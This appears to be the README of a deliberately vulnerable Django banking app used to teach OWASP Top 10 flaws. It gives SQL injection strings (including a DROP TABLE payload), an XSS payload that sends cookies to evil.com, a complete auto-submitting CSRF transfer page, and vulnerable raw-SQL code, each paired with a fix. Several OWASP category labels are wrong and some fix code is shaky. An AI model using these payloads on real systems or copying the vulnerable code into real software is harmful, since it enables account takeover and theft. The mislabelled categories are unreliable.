# Vulnerable Banking App: A Learning Tool for OWASP Top 10 Vulnerabilities

This Django-based banking application is intentionally vulnerable to demonstrate common web security flaws listed in the OWASP Top 10 (2021). It serves as an educational tool for teaching secure coding practices by allowing users to exploit vulnerabilities in a safe, controlled environment and learn how to fix them. The app uses Nigerian Naira (₦) for currency and includes a public homepage, user authentication (register, login, logout), a dashboard, money transfer functionality, and transaction history.

**Never deploy this app in production.**

This README provides:
- Setup instructions for running the app locally.
- A detailed guide to exploiting and fixing each vulnerability.
- A sample CSRF attack page to demonstrate Cross-Site Request Forgery.
- Best practices for secure coding to address each issue.

## Table of Contents

- [Prerequisites](#prerequisites)
- [Setup Instructions](#setup-instructions)
- [App Overview](#app-overview)
- [OWASP Top 10 Vulnerabilities](#owasp-top-10-vulnerabilities)
  - [A01:2021 - Broken Access Control (IDOR)](#a012021---broken-access-control-idor)
  - [A03:2021 - Injection (SQL Injection)](#a032021---injection-sql-injection)
  - [A02:2021 - Cross-Site Scripting (XSS)](#a022021---cross-site-scripting-xss)
  - [A05:2021 - Security Misconfiguration (CSRF)](#a052021---security-misconfiguration-csrf)
  - [A07:2021 - Sensitive Data Exposure](#a072021---sensitive-data-exposure)
  - [A08:2021 - Business Logic Flaw (Negative Balance)](#a082021---business-logic-flaw-negative-balance)
  - [A09:2021 - Weak Password Handling](#a092021---weak-password-handling)
- [Additional Notes](#additional-notes)

## Prerequisites

- **Python 3.9+**: Install Python to run the Django app.
- **Django**: Install via `pip install django`.
- **Tools**:
  - **Burp Suite**: For intercepting and manipulating HTTP requests.
  - **Web Browser**: Chrome or Firefox for testing.
  - **SQL Client**: For exploring the SQLite database (e.g., DB Browser for SQLite).

### Environment
Use a virtual machine (VM) or Docker container for isolation (e.g., `docker run -p 8000:8000 python:3.9`).

### Test Data
Create test users via the registration page or Django admin (`python manage.py createsuperuser`):
- **User1**: Username: `alice`, Password: `password123`, Email: `alice@example.com`, Account Number: `123456`, Balance: ₦100,000.00
- **User2**: Username: `bob`, Password: `password123`, Email: `bob@example.com`, Account Number: `789012`, Balance: ₦100,000.00
- **Hacker**: Username: `hacker`, Password: `password123`, Email: `hacker@example.com`, Account Number: `152982`, Balance: ₦100,000.00 (for CSRF demo)

## Setup Instructions

### 1. Clone the Repository
```bash
git clone <repository-url>
cd vulnerable-banking-app
```

### 2. Set Up Virtual Environment
```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

### 3. Install Dependencies
```bash
pip install django
```

### 4. Configure Django Settings
Ensure `settings.py` includes:
```python
LOGIN_URL = '/login/'
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [BASE_DIR / 'templates'],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
                'bank.context_processors.user_account',
            ],
        },
    },
]
```

Ensure `INSTALLED_APPS` includes `bank`.

The context processor (`bank/context_processors.py`) is already included:
```python
from django.contrib.auth.models import User
from .models import Account

def user_account(request):
    if request.user.is_authenticated:
        try:
            account = Account.objects.get(user=request.user)
            return {'user': request.user, 'user_account': account}
        except Account.DoesNotExist:
            return {'user': request.user, 'user_account': None}
    return {'user': request.user, 'user_account': None}
```

### 5. Set Up Database

The repository excludes `db.sqlite3` via `.gitignore` to prevent data conflicts and ensure security.

Generate a new database:
```bash
python manage.py makemigrations
python manage.py migrate
```

Create test users (`alice`, `bob`, `hacker`) via the registration page (`http://localhost:8000/register/`) or Django admin:
```bash
python manage.py createsuperuser
```

Ensure the `hacker` account has account number `152982` for the CSRF demo (modify via Django admin if needed).

### 6. Run the Server
```bash
python manage.py runserver
```

Access the app at `http://localhost:8000`.

### Directory Structure
- **templates/**: Contains `base.html`, `home.html`.
- **bank/templates/bank/**: Contains `login.html`, `register.html`, `dashboard.html`, `transfer.html`, `transactions.html`.
- **bank/**: Contains `views.py`, `models.py`, `urls.py`, `context_processors.py`.
- **.gitignore**: Excludes `db.sqlite3`, `venv/`, and other sensitive files.

## App Overview

### Homepage (`/`, `home.html`)
Public page explaining the app's educational purpose, listing features (register, login, dashboard, transfer, transactions, logout). No login required.

### Navigation Bar (`base.html`)
Consistent across all pages, showing:
- **Logged-out users**: Login, Register.
- **Logged-in users**: Dashboard, Transfer, Transactions (conditional on `user_account`), Logout.

### Features
- **Register**: Create a user and account with an initial balance of ₦100,000.00.
- **Login/Logout**: User authentication with intentional vulnerabilities.
- **Dashboard**: Displays account details and balance (₦).
- **Transfer**: Allows money transfers between accounts.
- **Transactions**: Shows transaction history for an account.

### Currency
All monetary values are in Nigerian Naira (₦).

## OWASP Top 10 Vulnerabilities

The app demonstrates the following vulnerabilities, with steps to exploit and fix each.

### A01:2021 - Broken Access Control (IDOR)

**Location**: `views.py` (transactions), `transactions.html`

**Issue**: The transactions view does not verify if the requested `account_id` belongs to the logged-in user, allowing Insecure Direct Object Reference (IDOR).

**Code**:
```python
account_id = request.GET.get('account_id')
account = Account.objects.get(id=account_id)
```

#### Demonstration
1. Log in as `alice` (Account ID: 1, Account Number: 123456).
2. Navigate to `http://localhost:8000/transactions/?account_id=1`.
3. Modify the URL to `http://localhost:8000/transactions/?account_id=2` (Bob's account).
4. View Bob's transaction history without authorization.
5. Test error case: Access `http://localhost:8000/transactions/?account_id=` (empty `account_id`) to trigger a `ValueError`.

**Impact**: Unauthorized access to any user's transaction history.

#### Fix
Update `views.py` to enforce access control and handle errors:
```python
@login_required
def transactions(request):
    account_id = request.GET.get('account_id')
    if not account_id or not account_id.isdigit():
        return redirect('dashboard', message='Please select a valid account')
    try:
        account = Account.objects.get(id=account_id)
        if account.user != request.user:
            return redirect('dashboard', message='Unauthorized access to account')
        transactions = Transaction.objects.filter(
            models.Q(from_account=account) | models.Q(to_account=account))
        return render(request, 'transactions.html', {
            'transactions': transactions,
            'account': account,
            'user': request.user
        })
    except Account.DoesNotExist:
        return redirect('dashboard', message='Account not found')
```

Update `base.html` to use `user_account`:
```html
{% if user_account %}
    <a href="{% url 'transactions' %}?account_id={{ user_account.id }}" class="hover:underline">Transactions</a>
{% endif %}
```

**Explanation**: Validates `account_id`, checks ownership (`account.user == request.user`), and handles errors gracefully.

### A03:2021 - Injection (SQL Injection)

**Location**: `views.py` (user_login, register)

**Issue**: Raw SQL queries in `user_login` and `register` allow SQL injection by directly embedding user input.

**Code**:
```python
# Login
cursor.execute(f"SELECT * FROM auth_user WHERE username = '{username}' AND password = '{password}'")
# Register
cursor.execute(f"INSERT INTO auth_user ... VALUES ('{username}', '{password}', '{email}', ...)")
```

#### Demonstration
1. In the login form, enter:
   - **Username**: `alice' OR '1'='1`
   - **Password**: `anything`

2. This manipulates the query to:
   ```sql
   SELECT * FROM auth_user WHERE username = 'alice' OR '1'='1' AND password = 'anything'
   ```

3. Logs in as `alice` without knowing the password.

4. For registration, use a malicious username like `hacker'; DROP TABLE auth_user; --` to attempt destructive queries.

**Impact**: Unauthorized access, data manipulation, or database destruction.

#### Fix
Use Django's ORM for safe queries:
```python
from django.contrib.auth import authenticate
from django.views.decorators.csrf import csrf_protect

@csrf_protect
def user_login(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        user = authenticate(request, username=username, password=password)
        if user:
            login(request, user)
            return redirect('dashboard')
        return render(request, 'login.html', {'error': 'Invalid credentials'})
    return render(request, 'login.html')
```

For registration:
```python
from django.contrib.auth.models import User

@csrf_protect
def register(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        email = request.POST.get('email')
        if User.objects.filter(username=username).exists():
            return render(request, 'register.html', {'error': 'Username taken'})
        user = User.objects.create_user(username=username, password=password, email=email)
        Account.objects.create(user=user, account_number=str(random.randint(100000, 999999)), balance=100000.00)
        return redirect('login')
    return render(request, 'register.html')
```

**Explanation**: Uses Django's ORM and `authenticate` to prevent SQL injection by sanitizing inputs.

### A02:2021 - Cross-Site Scripting (XSS)

**Location**: `dashboard.html`, `views.py` (dashboard)

**Issue**: The `message` parameter is rendered without escaping, allowing stored XSS.

**Code**:
```html
{% if message %}
    <div class="bg-yellow-100 p-4 rounded">{{ message|safe }}</div>
{% endif %}
```

```python
message = request.GET.get('message', '')
```

#### Demonstration
1. Log in as `alice`.
2. Visit `http://localhost:8000/dashboard/?message=<script>alert('XSS Attack!');</script>`.
3. Observe a JavaScript alert box, indicating script execution.
4. Advanced: Use Burp Suite to inject `<script>document.location='http://evil.com/steal?cookie='+document.cookie;</script>` to steal cookies.

**Impact**: Session hijacking, data theft, or malicious redirects.

#### Fix
Remove `|safe` filter and escape output:
```html
{% if message %}
    <div class="bg-yellow-100 p-4 rounded">{{ message }}</div>
{% endif %}
```

Validate message in `views.py`:
```python
from django.utils.html import escape

@login_required
def dashboard(request):
    user = request.user
    account = Account.objects.get(user=user)
    message = escape(request.GET.get('message', ''))
    return render(request, 'dashboard.html', {
        'account': account,
        'message': message,
        'user': user
    })
```

**Explanation**: Escapes user input to prevent script execution, ensuring safe rendering.

### A05:2021 - Security Misconfiguration (CSRF)

**Location**: `views.py` (transfer, user_login, register, user_logout), `transfer.html`

**Issue**: Missing CSRF tokens in forms and `@csrf_exempt` on views allow Cross-Site Request Forgery attacks.

**Code**:
```python
@csrf_exempt
def transfer(request):
    ...
```

```html
<form method="POST" action="{% url 'transfer' %}">
    <!-- No CSRF token -->
```

#### Demonstration
1. Create a test account for the attacker:
   - Register a user: Username: `hacker`, Password: `password123`, Email: `hacker@example.com`.
   - Ensure the account number is `152982` (modify via Django admin if needed).

2. Host the following malicious HTML page (save as `csrf_attack.html` in the repository):
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack</title>
</head>
<body>
<form action="http://127.0.0.1:8000/transfer/" method="POST">
    <input type="hidden" name="to_account" value="152982">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="description" value="CSRF Attack">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

3. Log in as `alice` in the app.
4. Open `csrf_attack.html` in the same browser (e.g., via `file://` or a local server like `python -m http.server 8080`).
5. The form auto-submits, transferring ₦1,000 from `alice` to the `hacker` account (152982) without consent.

**Impact**: Unauthorized fund transfers or account actions.

#### Fix
Remove `@csrf_exempt` and add `@csrf_protect`:
```python
from django.views.decorators.csrf import csrf_protect

@login_required
@csrf_protect
def transfer(request):
    ...
```

Add CSRF token to `transfer.html`:
```html
<form method="POST" action="{% url 'transfer' %}">
    {% csrf_token %}
    <div class="mb-4">
        <label class="block text-gray-700">To Account Number</label>
        <input type="text" name="to_account" class="w-full p-2 border rounded">
    </div>
    <div class="mb-4">
        <label class="block text-gray-700">Amount (₦)</label>
        <input type="number" step="0.01" name="amount" class="w-full p-2 border rounded">
    </div>
    <div class="mb-4">
        <label class="block text-gray-700">Description</label>
        <input type="text" name="description" class="w-full p-2 border rounded">
    </div>
    <button type="submit" class="w-full bg-blue-500 text-white p-2 rounded hover:bg-blue-600">Transfer</button>
</form>
```

**Explanation**: Enforces CSRF tokens to verify request authenticity, preventing unauthorized actions.

### A07:2021 - Sensitive Data Exposure

**Location**: `views.py` (transactions)

**Issue**: Transaction history exposes sensitive data (account numbers, balances) without proper access controls.

**Code**:
```python
transactions = Transaction.objects.filter(
    models.Q(from_account=account) | models.Q(to_account=account))
```

#### Demonstration
1. Exploit the IDOR vulnerability (see A01) to view another user's transactions.
2. Observe exposed account numbers and balances in `transactions.html`.

**Impact**: Leakage of sensitive financial data.

#### Fix
Already addressed in the IDOR fix by checking `account.user == request.user`.

Additionally, limit exposed data in `transactions.html`:
```html
{% for transaction in transactions %}
    <tr>
        <td>{{ transaction.timestamp }}</td>
        <td>{{ transaction.from_account.account_number }}</td>
        <td>{{ transaction.to_account.account_number }}</td>
        <td>₦{{ transaction.amount }}</td>
        <td>{{ transaction.description }}</td>
    </tr>
{% endfor %}
```

Ensure no unnecessary fields (e.g., full user details) are exposed.

**Explanation**: Restricts data access to authorized users and minimizes exposed information.

### A08:2021 - Business Logic Flaw (Negative Balance)

**Location**: `views.py` (transfer)

**Issue**: No validation prevents transferring more money than available, leading to negative balances.

**Code**:
```python
amount_decimal = Decimal(amount)
from_account.balance -= amount_decimal
to_account.balance += amount_decimal
```

#### Demonstration
1. Log in as `alice` (balance: ₦100,000).
2. Transfer ₦150,000 to `bob`.
3. Observe `alice`'s balance becomes negative (e.g., ₦-50,000).

**Impact**: Financial inconsistencies and potential exploitation.

#### Fix
Add balance validation:
```python
@login_required
@csrf_protect
def transfer(request):
    if request.method == 'POST':
        from_account = Account.objects.get(user=request.user)
        to_account_number = request.POST.get('to_account')
        amount = request.POST.get('amount')
        description = request.POST.get('description')
        try:
            to_account = Account.objects.get(account_number=to_account_number)
            amount_decimal = Decimal(amount)
            if amount_decimal <= 0 or from_account.balance < amount_decimal:
                return render(request, 'transfer.html', {'error': 'Invalid amount or insufficient balance'})
            from_account.balance -= amount_decimal
            to_account.balance += amount_decimal
            from_account.save()
            to_account.save()
            Transaction.objects.create(
                from_account=from_account,
                to_account=to_account,
                amount=amount_decimal,
                description=description
            )
            return redirect('dashboard')
        except Account.DoesNotExist:
            return render(request, 'transfer.html', {'error': 'Recipient account not found'})
    return render(request, 'transfer.html')
```

**Explanation**: Validates transfer amount and ensures sufficient balance before processing.

### A09:2021 - Weak Password Handling

**Location**: `views.py` (register)

**Issue**: No password strength validation, storing passwords in plaintext (simulated via raw SQL).

**Code**:
```python
password = request.POST.get('password')
cursor.execute(f"INSERT INTO auth_user ... VALUES ('{username}', '{password}', ...)")
```

#### Demonstration
1. Register a user with a weak password (e.g., `123`).
2. Log in easily due to lack of complexity requirements.
3. Use SQL injection (see A03) to extract plaintext passwords.

**Impact**: Easy account compromise due to weak passwords.

#### Fix
Use Django's password hashing and enforce strong passwords:
```python
import re

@csrf_protect
def register(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        email = request.POST.get('email')
        if not re.match(r'^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$', password):
            return render(request, 'register.html', {'error': 'Password must be 8+ characters with letters and numbers'})
        if User.objects.filter(username=username).exists():
            return render(request, 'register.html', {'error': 'Username taken'})
        user = User.objects.create_user(username=username, password=password, email=email)
        Account.objects.create(user=user, account_number=str(random.randint(100000, 999999)), balance=100000.00)
        return redirect('login')
    return render(request, 'register.html')
```

**Explanation**: Enforces strong passwords and uses Django's secure password hashing.

## Additional Notes

- **Controlled Environment**: Always run in a VM or Docker to prevent unintended damage.
- **Database Security**: The SQLite database (`db.sqlite3`) is excluded from the repository via `.gitignore` to prevent data leaks. Users must generate their own database using migrations and create test accounts.
- **Educational Purpose**: The app is designed for learning, not real banking. Vulnerabilities are intentional for demonstration.
- **Testing**: Use test accounts (`alice`, `bob`, `hacker`) and avoid production data.
- **Further Exploration**:
  - Add rate limiting to prevent brute-force attacks.
  - Implement session timeout for enhanced security.
  - Explore other OWASP vulnerabilities (e.g., A10:2021 - Server-Side Request Forgery).

For questions or contributions, open an issue on GitHub.